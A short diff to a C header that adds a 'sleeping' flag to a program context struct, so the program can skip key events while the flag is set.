@@ -25,6 +25,7 @@ typedef struct {
     HANDLE hMutexThreadSync;   // thread mutex handle
     
     BOOL shutdown;  // shutdown flag updated in the commands.c source file
+    BOOL sleeping;  // if true, the key events will be skipped 
 } PROGRAM_CONTEXT;
 
 extern PROGRAM_CONTEXT* progContext;  // Global program context variable
